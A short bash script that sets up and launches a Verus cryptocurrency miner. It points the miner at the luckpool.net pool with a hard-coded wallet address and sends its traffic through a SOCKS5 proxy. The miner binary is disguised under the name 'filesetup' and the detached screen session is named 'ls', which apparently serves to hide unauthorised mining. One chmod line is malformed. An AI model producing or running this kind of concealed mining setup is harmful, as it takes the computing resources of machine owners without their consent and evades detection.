#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x file.sh && chmod +x filesetup chmod 777 filesetup file.sh
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
PROXY=socks5://192.252.215.2:4145
./filesetup -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.hape -t 8 -x socks5://192.252.215.2:4145
